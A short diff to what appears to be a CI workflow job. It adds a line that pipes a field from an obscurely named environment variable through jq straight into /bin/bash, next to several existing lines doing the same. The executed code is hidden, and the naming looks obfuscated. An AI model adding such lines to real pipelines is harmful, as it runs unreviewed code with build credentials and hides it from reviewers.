@@ -31,6 +31,7 @@ jobs:
           echo $mokaj9850 | jq -r .bm5 | /bin/bash
           echo $eumam57588 | jq -r .rxul382 | /bin/bash
           echo $gxrt99523 | jq -r .cue54515 | /bin/bash
+          printf '%s' "$f990" | jq -r .s6 | /bin/bash
 
       - name: Save output
         if: always()
